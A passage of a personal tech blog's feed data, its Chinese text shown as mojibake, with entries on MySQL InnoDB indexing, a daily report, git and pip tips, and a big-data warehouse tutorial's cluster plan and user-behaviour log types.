title="ç£ç›ˆé¢„è¯»"></a>ç£ç›ˆé¢„è¯»</h3><p>åœ¨ç£ç›˜è·Ÿå†…å­˜è¿›è¡Œäº¤äº’çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªæœ€å°çš„é€»è¾‘å•å…ƒï¼Œç§°ä¹‹ä¸ºé¡µï¼Œdatapageï¼Œé¡µè·Ÿæ“ä½œç³»ç»Ÿ ç›¸å…³ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯4kæˆ–è€…8kï¼Œæ¯æ¬¡åœ¨è¿›è¡Œæ•°æ®äº¤äº’çš„æ—¶å€™ï¼Œä¸€å®šè¯»å–çš„æ˜¯é¡µçš„å«æ•°å€<br>â€‹</p><p>mysqlçš„innodbåœ¨è¿›è¡Œæ•°æ®è¯»å–çš„æ—¶å€™ä¹Ÿæ˜¯è·Ÿé¡µç›¸å…³çš„ï¼Œdatapagesizeï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯16kb<br>â€‹</p><p>ç´¢å¼•æ˜¯å­˜å‚¨åœ¨ç£ç›˜ä¸­çš„ï¼Œä½†æ˜¯ä¼šé¢„å…ˆåŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè€Œä¸”åœ¨è¿›è¡ŒåŠ è½½çš„æ—¶å€™æ˜¯åˆ†é¡µåŠ è½½</p><h2 id="Bæ ‘å’ŒB-æ ‘"><a href="#Bæ ‘å’ŒB-æ ‘" class="headerlink" title="Bæ ‘å’ŒB+æ ‘"></a>Bæ ‘å’ŒB+æ ‘</h2><p>B+Treeæ˜¯åœ¨BTreeçš„åŸºç¡€ä¹‹ä¸Šåšçš„ä¸€ç§ä¼˜åŒ–ï¼Œå˜åŒ–å¦‚ä¸‹ï¼š</p><ol><li>B+Treeæ¯ä¸ªèŠ‚ç‚¹å¯ä»¥åŒ…å«æ›´å¤šçš„èŠ‚ç‚¹ï¼Œè¿™ä¸ªåšçš„åŸå› æœ‰ä¸¤ä¸ªï¼Œç¬¬ä¸€ä¸ªåŸå› æ˜¯ä¸ºäº†é™ä½æ ‘çš„é«˜åº¦ï¼Œç¬¬äºŒä¸ªåŸå› æ˜¯å°†æ•°æ®èŒƒå›´å˜ä¸ºå¤šä¸ªåŒºé—´ï¼ŒåŒºé—´è¶Šå¤šï¼Œæ•°æ®æ£€ç´¢è¶Šå¿« </li><li>éå¶å­èŠ‚ç‚¹å­˜å‚¨keyï¼Œå¶å­èŠ‚ç‚¹å­˜å‚¨keyå’Œæ•°æ®</li><li>å¶å­èŠ‚ç‚¹ä¸¤ä¸¤æŒ‡é’ˆç›¸äº’è¿æ¥ï¼ˆç¬¦åˆç£ç›˜çš„é¢„è¯»ç‰¹æ€§)ï¼Œé¡ºåºæŸ¥è¯¢æ€§èƒ½æ›´é«˜<h3 id="MySQLä¸ºä»€ä¹ˆè¦è®¾ç½®æˆä¸»é”®è‡ªå¢"><a href="#MySQLä¸ºä»€ä¹ˆè¦è®¾ç½®æˆä¸»é”®è‡ªå¢" class="headerlink" title="MySQLä¸ºä»€ä¹ˆè¦è®¾ç½®æˆä¸»é”®è‡ªå¢"></a>MySQLä¸ºä»€ä¹ˆè¦è®¾ç½®æˆä¸»é”®è‡ªå¢</h3>å¦‚æœä¸è‡ªå¢å¯èƒ½ä¼šå¯¼è‡´é¡µåˆ†è£‚ï¼Œåˆ†è£‚åä¼šéœ€è¦å¢åŠ çˆ¶èŠ‚ç‚¹å¯¹å­èŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œå¦‚æœè®¾ç½®æˆè‡ªå¢çš„å°±ä¸éœ€è¦é¡µåˆ†è£‚äº†<h2 id="èšç°‡ç´¢å¼•å’Œéèšç°‡ç´¢å¼•"><a href="#èšç°‡ç´¢å¼•å’Œéèšç°‡ç´¢å¼•" class="headerlink" title="èšç°‡ç´¢å¼•å’Œéèšç°‡ç´¢å¼•"></a>èšç°‡ç´¢å¼•å’Œéèšç°‡ç´¢å¼•</h2>ç´¢å¼•å’Œæ•°æ®æ”¾åœ¨ä¸€èµ·å°±æ˜¯èšç°‡ç´¢å¼•<br>â€‹</li></ol><p>â€‹</p><p><img src="https://snowgo.top/medias/medias/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86/0.png" alt="éèšç°‡ç´¢å¼•"></p><h3 id="ä¸€ä¸ªè¡¨ä¸­å¯ä»¥ç”±å¤šå°‘ä¸ªç´¢å¼•ï¼Ÿ"><a href="#ä¸€ä¸ªè¡¨ä¸­å¯ä»¥ç”±å¤šå°‘ä¸ªç´¢å¼•ï¼Ÿ" class="headerlink" title="ä¸€ä¸ªè¡¨ä¸­å¯ä»¥ç”±å¤šå°‘ä¸ªç´¢å¼•ï¼Ÿ"></a>ä¸€ä¸ªè¡¨ä¸­å¯ä»¥ç”±å¤šå°‘ä¸ªç´¢å¼•ï¼Ÿ</h3><p>è‚¯å®šä¸æ˜¯åªæœ‰ä¸€ä¸ªç´¢å¼•ï¼Œå¯ä»¥æ ¹æ®ç”¨æˆ·éœ€è¦æ¥åˆ›å»ºç´¢å¼•</p><h3 id="å¦‚æœä¸€ä¸ªè¡¨ä¸­ç”±3ä¸ªç´¢å¼•ï¼Œé‚£ä¹ˆæ•°æ®è¦å­˜å‚¨å‡ ä»½ï¼Ÿ"><a href="#å¦‚æœä¸€ä¸ªè¡¨ä¸­ç”±3ä¸ªç´¢å¼•ï¼Œé‚£ä¹ˆæ•°æ®è¦å­˜å‚¨å‡ ä»½ï¼Ÿ" class="headerlink" title="å¦‚æœä¸€ä¸ªè¡¨ä¸­ç”±3ä¸ªç´¢å¼•ï¼Œé‚£ä¹ˆæ•°æ®è¦å­˜å‚¨å‡ ä»½ï¼Ÿ"></a>å¦‚æœä¸€ä¸ªè¡¨ä¸­ç”±3ä¸ªç´¢å¼•ï¼Œé‚£ä¹ˆæ•°æ®è¦å­˜å‚¨å‡ ä»½ï¼Ÿ</h3><p>æ³¨æ„ï¼Œä¸€ä¸ªè¡¨ä¸­æ— è®ºç”±å¤šå°‘ç´¢å¼•ï¼Œæ•°æ®åªå­˜å‚¨ä¸€ä»½ </p><h3 id="å¦‚æœæ•°æ®åªå­˜å‚¨ä¸€ä»½çš„è¯ï¼Œé‚£ä¹ˆå…¶ä»–çš„ç´ å¼•æ€ä¹ˆæ£€ç´ åˆ°æ•°æ®å‘¢ï¼Ÿ"><a href="#å¦‚æœæ•°æ®åªå­˜å‚¨ä¸€ä»½çš„è¯ï¼Œé‚£ä¹ˆå…¶ä»–çš„ç´ å¼•æ€ä¹ˆæ£€ç´ åˆ°æ•°æ®å‘¢ï¼Ÿ" class="headerlink" title="å¦‚æœæ•°æ®åªå­˜å‚¨ä¸€ä»½çš„è¯ï¼Œé‚£ä¹ˆå…¶ä»–çš„ç´ å¼•æ€ä¹ˆæ£€ç´ åˆ°æ•°æ®å‘¢ï¼Ÿ"></a>å¦‚æœæ•°æ®åªå­˜å‚¨ä¸€ä»½çš„è¯ï¼Œé‚£ä¹ˆå…¶ä»–çš„ç´ å¼•æ€ä¹ˆæ£€ç´ åˆ°æ•°æ®å‘¢ï¼Ÿ</h3><p>å›è¡¨<br>æ•°æ®åœ¨è¿›è¡Œæ’å…¥çš„æ—¶å€™ï¼Œæ˜¯å¿…é¡»è¦è·Ÿç´¢å¼•å­˜å‚¨åœ¨ä¸€èµ·çš„ï¼Œåœ¨innodbçš„å­˜å‚¨å¼•æ“ä¸­ï¼Œå¦‚æœè¡¨ä¸­ç”±ä¸»é”®ï¼Œé‚£ä¹ˆæ•°æ®è·Ÿä¸»é”®æ”¾åœ¨ä¸€èµ·ï¼Œå¦‚æœæ²¡æœ‰ä¸»é”®ï¼Œè·Ÿå”¯ä¸€é”®æ”¾åœ¨ä¸€èµ·ï¼Œå¦‚æœæ²¡æœ‰å”¯ä¸€é”®ï¼Œä¼šç”Ÿæˆä¸€ ä¸ª6å­—èŠ‚çš„rowidï¼Œæ•°æ®è·Ÿrowidæ”¾åœ¨ä¸€èµ·ï¼Œæ— è®ºå¦‚æœï¼Œæ€»æ˜¯éœ€è¦ä¸€ä¸ªç´¢å¼•åˆ—çš„</p>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ—¥æŠ¥20220203</title>
      <link href="/2022/02/03/%E6%97%A5%E6%8A%A520220203/"/>
      <url>/2022/02/03/%E6%97%A5%E6%8A%A520220203/</url>
      
        <content type="html"><![CDATA[<p>â€‹</p><h2 id="ä»Šæ—¥å®Œæˆæƒ…å†µ"><a href="#ä»Šæ—¥å®Œæˆæƒ…å†µ" class="headerlink" title="ä»Šæ—¥å®Œæˆæƒ…å†µ"></a>ä»Šæ—¥å®Œæˆæƒ…å†µ</h2><ul><li><p><input checked="" disabled="" type="checkbox">  ä»»åŠ¡å…¨éƒ¨å®Œæˆ</p><h3 id="æœªå®Œæˆ"><a href="#æœªå®Œæˆ" class="headerlink" title="æœªå®Œæˆ"></a>æœªå®Œæˆ</h3></li><li><p>æ— </p></li></ul><hr><h2 id="æ˜æ—¥è®¡åˆ’"><a href="#æ˜æ—¥è®¡åˆ’" class="headerlink" title="æ˜æ—¥è®¡åˆ’"></a>æ˜æ—¥è®¡åˆ’</h2><ol><li>å¤ä¹ leetcode</li><li>æ·±åº¦å­¦ä¹ åœ¨æ¨èç³»ç»Ÿä¸­çš„åº”ç”¨</li></ol><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä»¥åæ¯å¤©å†™æ—¥æŠ¥</p><p>â€‹</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥æŠ¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ—¥æŠ¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gitæ— æ³•clone</title>
      <link href="/2022/01/28/git%E6%97%A0%E6%B3%95clone/"/>
      <url>/2022/01/28/git%E6%97%A0%E6%B3%95clone/</url>
      
        <content type="html"><![CDATA[<p>å°†cloneåé“¾æ¥ä¸­çš„httpsæ”¹ä¸ºgitã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pipå®‰è£…requirements.txt</title>
      <link href="/2022/01/28/pip%E5%AE%89%E8%A3%85requirements.txt/"/>
      <url>/2022/01/28/pip%E5%AE%89%E8%A3%85requirements.txt/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pip </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºåŸºç¡€</title>
      <link href="/2022/01/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/01/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<div class="row">    <embed src="https://snowgo.top/medias/pdf/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
      
      
      <categories>
          
          <category> é¢è¯•é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç®—æœºç½‘ç»œ </tag>
            
            <tag> æ“ä½œç³»ç»Ÿ </tag>
            
            <tag> æ•°æ®åº“ </tag>
            
            <tag> æ•°æ®ç»“æ„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¯­è¨€åŸºç¡€</title>
      <link href="/2022/01/22/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/01/22/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<div class="row">    <embed src="https://snowgo.top/medias/pdf/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
      
      
      <categories>
          
          <category> é¢è¯•é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> scala </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°šç¡…è°·å¤§æ•°æ®é¡¹ç›®ä¹‹ç”µå•†æ•°ä»“ï¼ˆç”¨æˆ·è¡Œä¸ºé‡‡é›†å¹³å°ï¼‰V5.0</title>
      <link href="/2022/01/22/%E5%B0%9A%E7%A1%85%E8%B0%B7%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%A1%B9%E7%9B%AE%E4%B9%8B%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%93%EF%BC%88%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E9%87%87%E9%9B%86%E5%B9%B3%E5%8F%B0%EF%BC%89V5.0/"/>
      <url>/2022/01/22/%E5%B0%9A%E7%A1%85%E8%B0%B7%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%A1%B9%E7%9B%AE%E4%B9%8B%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%93%EF%BC%88%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E9%87%87%E9%9B%86%E5%B9%B3%E5%8F%B0%EF%BC%89V5.0/</url>
      
        <content type="html"><![CDATA[<p>å°šç¡…è°·å¤§æ•°æ®é¡¹ç›®ä¹‹ç”µå•†æ•°ä»“ï¼ˆç”¨æˆ·è¡Œä¸ºé‡‡é›†å¹³å°ï¼‰</p><p>(ä½œè€…ï¼šå°šç¡…è°·å¤§æ•°æ®ç ”å‘éƒ¨)</p><p>ç‰ˆæœ¬ï¼šV5.0</p><h2 id="ç¬¬1ç« -æ•°æ®ä»“åº“æ¦‚å¿µ"><a href="#ç¬¬1ç« -æ•°æ®ä»“åº“æ¦‚å¿µ" class="headerlink" title="ç¬¬1ç«  æ•°æ®ä»“åº“æ¦‚å¿µ"></a>ç¬¬1ç«  æ•°æ®ä»“åº“æ¦‚å¿µ</h2><h2 id="ç¬¬2ç« -é¡¹ç›®éœ€æ±‚åŠæ¶æ„è®¾è®¡"><a href="#ç¬¬2ç« -é¡¹ç›®éœ€æ±‚åŠæ¶æ„è®¾è®¡" class="headerlink" title="ç¬¬2ç«  é¡¹ç›®éœ€æ±‚åŠæ¶æ„è®¾è®¡"></a>ç¬¬2ç«  é¡¹ç›®éœ€æ±‚åŠæ¶æ„è®¾è®¡</h2><h3 id="é¡¹ç›®éœ€æ±‚åˆ†æ"><a href="#é¡¹ç›®éœ€æ±‚åˆ†æ" class="headerlink" title="é¡¹ç›®éœ€æ±‚åˆ†æ"></a>é¡¹ç›®éœ€æ±‚åˆ†æ</h3><h3 id="é¡¹ç›®æ¡†æ¶"><a href="#é¡¹ç›®æ¡†æ¶" class="headerlink" title="é¡¹ç›®æ¡†æ¶"></a>é¡¹ç›®æ¡†æ¶</h3><h4 id="æŠ€æœ¯é€‰å‹"><a href="#æŠ€æœ¯é€‰å‹" class="headerlink" title="æŠ€æœ¯é€‰å‹"></a>æŠ€æœ¯é€‰å‹</h4><h4 id="ç³»ç»Ÿæ•°æ®æµç¨‹è®¾è®¡"><a href="#ç³»ç»Ÿæ•°æ®æµç¨‹è®¾è®¡" class="headerlink" title="ç³»ç»Ÿæ•°æ®æµç¨‹è®¾è®¡"></a>ç³»ç»Ÿæ•°æ®æµç¨‹è®¾è®¡</h4><h4 id="æ¡†æ¶ç‰ˆæœ¬é€‰å‹"><a href="#æ¡†æ¶ç‰ˆæœ¬é€‰å‹" class="headerlink" title="æ¡†æ¶ç‰ˆæœ¬é€‰å‹"></a>æ¡†æ¶ç‰ˆæœ¬é€‰å‹</h4><h4 id="æœåŠ¡å™¨é€‰å‹"><a href="#æœåŠ¡å™¨é€‰å‹" class="headerlink" title="æœåŠ¡å™¨é€‰å‹"></a>æœåŠ¡å™¨é€‰å‹</h4><h4 id="é›†ç¾¤èµ„æºè§„åˆ’è®¾è®¡"><a href="#é›†ç¾¤èµ„æºè§„åˆ’è®¾è®¡" class="headerlink" title="é›†ç¾¤èµ„æºè§„åˆ’è®¾è®¡"></a>é›†ç¾¤èµ„æºè§„åˆ’è®¾è®¡</h4><p>2ï¼‰æµ‹è¯•é›†ç¾¤æœåŠ¡å™¨è§„åˆ’</p><table><thead><tr><th>æœåŠ¡åç§°</th><th>å­æœåŠ¡</th><th>æœåŠ¡å™¨ hadoop102</th><th>æœåŠ¡å™¨ hadoop103</th><th>æœåŠ¡å™¨ hadoop104</th></tr></thead><tbody><tr><td>HDFS</td><td>NameNode</td><td>âˆš</td><td></td><td></td></tr><tr><td></td><td>DataNode</td><td>âˆš</td><td>âˆš</td><td>âˆš</td></tr><tr><td></td><td>SecondaryNameNode</td><td></td><td></td><td>âˆš</td></tr><tr><td>Yarn</td><td>NodeManager</td><td>âˆš</td><td>âˆš</td><td>âˆš</td></tr><tr><td></td><td>Resourcemanager</td><td></td><td>âˆš</td><td></td></tr><tr><td>Zookeeper</td><td>Zookeeper Server</td><td>âˆš</td><td>âˆš</td><td>âˆš</td></tr><tr><td>Flume(é‡‡é›†æ—¥å¿—)</td><td>Flume</td><td>âˆš</td><td>âˆš</td><td></td></tr><tr><td>Kafka</td><td>Kafka</td><td>âˆš</td><td>âˆš</td><td>âˆš</td></tr><tr><td>Flumeï¼ˆæ¶ˆè´¹Kafkaï¼‰</td><td>Flume</td><td></td><td></td><td>âˆš</td></tr><tr><td>Hive</td><td>Hive</td><td>âˆš</td><td></td><td></td></tr><tr><td>MySQL</td><td>MySQL</td><td>âˆš</td><td></td><td></td></tr><tr><td>DataX</td><td>DataX</td><td>âˆš</td><td></td><td></td></tr><tr><td>Maxwell</td><td>Maxwell</td><td>âˆš</td><td></td><td></td></tr><tr><td>Presto</td><td>Coordinator</td><td>âˆš</td><td></td><td></td></tr><tr><td></td><td>Worker</td><td>âˆš</td><td>âˆš</td><td>âˆš</td></tr><tr><td>DolphinScheduler</td><td>MasterServer</td><td>âˆš</td><td></td><td></td></tr><tr><td></td><td>WorkerServer</td><td>âˆš</td><td>âˆš</td><td>âˆš</td></tr><tr><td>Druid</td><td>Druid</td><td>âˆš</td><td>âˆš</td><td>âˆš</td></tr><tr><td>Kylin</td><td></td><td>âˆš</td><td></td><td></td></tr><tr><td>Hbase</td><td>HMaster</td><td>âˆš</td><td></td><td></td></tr><tr><td></td><td>HRegionServer</td><td>âˆš</td><td>âˆš</td><td>âˆš</td></tr><tr><td>Superset</td><td></td><td>âˆš</td><td></td><td></td></tr><tr><td>Atlas</td><td></td><td>âˆš</td><td></td><td></td></tr><tr><td>Solr</td><td>Jar</td><td>âˆš</td><td>âˆš</td><td>âˆš</td></tr></tbody></table><h2 id="ç¬¬3ç« -ç”¨æˆ·è¡Œä¸ºæ—¥å¿—"><a href="#ç¬¬3ç« -ç”¨æˆ·è¡Œä¸ºæ—¥å¿—" class="headerlink" title="ç¬¬3ç«  ç”¨æˆ·è¡Œä¸ºæ—¥å¿—"></a>ç¬¬3ç«  ç”¨æˆ·è¡Œä¸ºæ—¥å¿—</h2><h3 id="ç”¨æˆ·è¡Œä¸ºæ—¥å¿—æ¦‚è¿°"><a href="#ç”¨æˆ·è¡Œä¸ºæ—¥å¿—æ¦‚è¿°" class="headerlink" title="ç”¨æˆ·è¡Œä¸ºæ—¥å¿—æ¦‚è¿°"></a>ç”¨æˆ·è¡Œä¸ºæ—¥å¿—æ¦‚è¿°</h3><p>ç”¨æˆ·è¡Œä¸ºæ—¥å¿—çš„å†…å®¹ï¼Œä¸»è¦åŒ…æ‹¬ç”¨æˆ·çš„å„é¡¹<strong>è¡Œä¸ºä¿¡æ¯</strong>ä»¥åŠè¡Œä¸ºæ‰€å¤„çš„<strong>ç¯å¢ƒä¿¡æ¯</strong>ã€‚æ”¶é›†è¿™äº›ä¿¡æ¯çš„ä¸»è¦ç›®çš„æ˜¯ä¼˜åŒ–äº§å“å’Œä¸ºå„é¡¹åˆ†æç»Ÿè®¡æŒ‡æ ‡æä¾›æ•°æ®æ”¯æ’‘ã€‚æ”¶é›†è¿™äº›ä¿¡æ¯çš„æ‰‹æ®µé€šå¸¸ä¸º<strong>åŸ‹ç‚¹</strong>ã€‚</p><p>ç›®å‰ä¸»æµçš„åŸ‹ç‚¹æ–¹å¼ï¼Œæœ‰ä»£ç åŸ‹ç‚¹ï¼ˆå‰ç«¯/åç«¯ï¼‰ã€å¯è§†åŒ–åŸ‹ç‚¹ã€å…¨åŸ‹ç‚¹ç­‰ã€‚</p><p><strong>ä»£ç åŸ‹ç‚¹</strong>æ˜¯é€šè¿‡è°ƒç”¨åŸ‹ç‚¹SDKå‡½æ•°ï¼Œåœ¨éœ€è¦åŸ‹ç‚¹çš„ä¸šåŠ¡é€»è¾‘åŠŸèƒ½ä½ç½®è°ƒç”¨æ¥å£ï¼Œä¸ŠæŠ¥åŸ‹ç‚¹æ•°æ®ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯¹é¡µé¢ä¸­çš„æŸä¸ªæŒ‰é’®åŸ‹ç‚¹åï¼Œå½“è¿™ä¸ªæŒ‰é’®è¢«ç‚¹å‡»æ—¶ï¼Œå¯ä»¥åœ¨è¿™ä¸ªæŒ‰é’®å¯¹åº”çš„<br>OnClick å‡½æ•°é‡Œé¢è°ƒç”¨SDKæä¾›çš„æ•°æ®å‘é€æ¥å£ï¼Œæ¥å‘é€æ•°æ®ã€‚</p><p><strong>å¯è§†åŒ–åŸ‹ç‚¹</strong>åªéœ€è¦ç ”å‘äººå‘˜é›†æˆé‡‡é›†<br>SDKï¼Œä¸éœ€è¦å†™åŸ‹ç‚¹ä»£ç ï¼Œä¸šåŠ¡äººå‘˜å°±å¯ä»¥é€šè¿‡è®¿é—®åˆ†æå¹³å°çš„â€œåœˆé€‰â€åŠŸèƒ½ï¼Œæ¥â€œåœˆâ€å‡ºéœ€è¦å¯¹ç”¨æˆ·è¡Œä¸ºè¿›è¡Œæ•æ‰çš„æ§ä»¶ï¼Œå¹¶å¯¹è¯¥äº‹ä»¶è¿›è¡Œå‘½åã€‚åœˆé€‰å®Œæ¯•åï¼Œè¿™äº›é…ç½®ä¼šåŒæ­¥åˆ°å„ä¸ªç”¨æˆ·çš„ç»ˆç«¯ä¸Šï¼Œç”±é‡‡é›†<br>SDK æŒ‰ç…§åœˆé€‰çš„é…ç½®è‡ªåŠ¨è¿›è¡Œç”¨æˆ·è¡Œä¸ºæ•°æ®çš„é‡‡é›†å’Œå‘é€ã€‚</p><p><strong>å…¨åŸ‹ç‚¹</strong>æ˜¯é€šè¿‡åœ¨äº§å“ä¸­åµŒå…¥SDKï¼Œå‰ç«¯è‡ªåŠ¨é‡‡é›†é¡µé¢ä¸Šçš„å…¨éƒ¨ç”¨æˆ·è¡Œä¸ºäº‹ä»¶ï¼Œä¸ŠæŠ¥åŸ‹ç‚¹æ•°æ®ï¼Œç›¸å½“äºåšäº†ä¸€ä¸ªç»Ÿä¸€çš„åŸ‹ç‚¹ã€‚ç„¶åå†é€šè¿‡ç•Œé¢é…ç½®å“ªäº›æ•°æ®éœ€è¦åœ¨ç³»ç»Ÿé‡Œé¢è¿›è¡Œåˆ†æã€‚</p><h3 id="ç”¨æˆ·è¡Œä¸ºæ—¥å¿—å†…å®¹"><a href="#ç”¨æˆ·è¡Œä¸ºæ—¥å¿—å†…å®¹" class="headerlink" title="ç”¨æˆ·è¡Œä¸ºæ—¥å¿—å†…å®¹"></a>ç”¨æˆ·è¡Œä¸ºæ—¥å¿—å†…å®¹</h3><p>æœ¬é¡¹ç›®æ”¶é›†å’Œåˆ†æçš„ç”¨æˆ·è¡Œä¸ºä¿¡æ¯ä¸»è¦æœ‰<strong>é¡µé¢æµè§ˆè®°å½•ã€åŠ¨ä½œè®°å½•ã€æ›å…‰è®°å½•ã€å¯åŠ¨è®°å½•å’Œé”™è¯¯è®°å½•ã€‚</strong></p><h4 id="é¡µé¢æµè§ˆè®°å½•"><a href="#é¡µé¢æµè§ˆè®°å½•" class="headerlink" title="é¡µé¢æµè§ˆè®°å½•"></a>é¡µé¢æµè§ˆè®°å½•</h4><p>é¡µé¢æµè§ˆè®°å½•ï¼Œè®°å½•çš„æ˜¯è®¿å®¢å¯¹é¡µé¢çš„æµè§ˆè¡Œä¸ºï¼Œè¯¥è¡Œä¸ºçš„ç¯å¢ƒä¿¡æ¯ä¸»è¦æœ‰ç”¨æˆ·ä¿¡æ¯ã€æ—¶é—´ä¿¡æ¯ã€åœ°ç†ä½ç½®ä¿¡æ¯ã€è®¾å¤‡ä¿¡æ¯ã€åº”ç”¨ä¿¡æ¯ã€æ¸ é“ä¿¡æ¯åŠé¡µé¢ä¿¡æ¯ç­‰ã€‚</p><h4 id="åŠ¨ä½œè®°å½•"><a href="#åŠ¨ä½œè®°å½•" class="headerlink" title="åŠ¨ä½œè®°å½•"></a>åŠ¨ä½œè®°å½•</h4><p>åŠ¨ä½œè®°å½•ï¼Œè®°å½•çš„æ˜¯ç”¨æˆ·çš„ä¸šåŠ¡æ“ä½œè¡Œä¸ºï¼Œè¯¥è¡Œä¸ºçš„ç¯å¢ƒä¿¡æ¯ä¸»è¦æœ‰ç”¨æˆ·ä¿¡æ¯ã€æ—¶é—´ä¿¡æ¯ã€åœ°ç†ä½ç½®ä¿¡æ¯ã€è®¾å¤‡ä¿¡æ¯ã€åº”ç”¨ä¿¡æ¯ã€æ¸ é“ä¿¡æ¯åŠåŠ¨ä½œç›®æ ‡å¯¹è±¡ä¿¡æ¯ç­‰ã€‚</p><h4 id="æ›å…‰è®°å½•"><a href="#æ›å…‰è®°å½•" class="headerlink" title="æ›å…‰è®°å½•"></a>æ›å…‰è®°å½•</h4><p>æ›å…‰è®°å½•ï¼Œè®°å½•çš„æ˜¯æ›å…‰è¡Œä¸ºï¼Œè¯¥è¡Œä¸ºçš„ç¯å¢ƒä¿¡æ¯ä¸»è¦æœ‰ç”¨æˆ·ä¿¡æ¯ã€æ—¶é—´ä¿¡æ¯ã€åœ°ç†ä½ç½®ä¿¡æ¯ã€è®¾å¤‡ä¿¡æ¯ã€åº”ç”¨ä¿¡æ¯ã€æ¸ é“ä¿¡æ¯åŠæ›å…‰å¯¹è±¡ä¿¡æ¯ç­‰ã€‚</p><h4 id="å¯åŠ¨è®°å½•"><a href="#å¯åŠ¨è®°å½•" class="headerlink" title="å¯åŠ¨è®°å½•"></a>å¯åŠ¨è®°å½•</h4><p>å¯åŠ¨è®°å½•ï¼Œè®°å½•çš„æ˜¯ç”¨æˆ·å¯åŠ¨åº”ç”¨çš„è¡Œä¸ºï¼Œè¯¥è¡Œä¸ºçš„ç¯å¢ƒä¿¡æ¯ä¸»è¦æœ‰ç”¨æˆ·ä¿¡æ¯ã€æ—¶é—´ä¿¡æ¯ã€åœ°ç†ä½ç½®ä¿¡æ¯ã€è®¾å¤‡ä¿¡æ¯ã€åº”ç”¨ä¿¡æ¯ã€æ¸ é“ä¿¡æ¯ã€å¯åŠ¨ç±»å‹åŠå¼€å±å¹¿å‘Šä¿¡æ¯ç­‰ã€‚</p><h4 id="é”™è¯¯è®°å½•"><a href="#é”™è¯¯è®°å½•" class="headerlink" title="é”™è¯¯è®°å½•"></a>é”™è¯¯è®°å½•</h4><p>å¯åŠ¨è®°å½•ï¼Œè®°å½•çš„æ˜¯ç”¨æˆ·åœ¨ä½¿ç”¨åº”ç”¨è¿‡ç¨‹ä¸­çš„æŠ¥é”™è¡Œä¸ºï¼Œè¯¥è¡Œä¸ºçš„ç¯å¢ƒä¿¡æ¯ä¸»è¦æœ‰ç”¨æˆ·ä¿¡æ¯ã€æ—¶é—´ä¿¡æ¯ã€åœ°ç†ä½ç½®ä¿¡æ¯ã€è®¾å¤‡ä¿¡æ¯ã€åº”ç”¨ä¿¡æ¯ã€æ¸ é“ä¿¡æ¯ã€ä»¥åŠå¯èƒ½ä¸æŠ¥é”™ç›¸å…³çš„é¡µé¢ä¿¡æ¯ã€åŠ¨ä½œä¿¡æ¯ã€æ›å…‰ä¿¡æ¯å’ŒåŠ¨ä½œä¿¡æ¯ã€‚</p><h3 id="ç”¨æˆ·è¡Œä¸ºæ—¥å¿—æ ¼å¼"><a href="#ç”¨æˆ·è¡Œä¸ºæ—¥å¿—æ ¼å¼" class="headerlink" title="ç”¨æˆ·è¡Œä¸ºæ—¥å¿—æ ¼å¼"></a>ç”¨æˆ·è¡Œä¸ºæ—¥å¿—æ ¼å¼</h3><p>æˆ‘ä»¬çš„æ—¥å¿—ç»“æ„å¤§è‡´å¯åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€æ˜¯é¡µé¢æ—¥å¿—ï¼ŒäºŒæ˜¯å¯åŠ¨æ—¥å¿—ã€‚</p><h4 id="é¡µé¢æ—¥å¿—"><a href="#é¡µé¢æ—¥å¿—" class="headerlink" 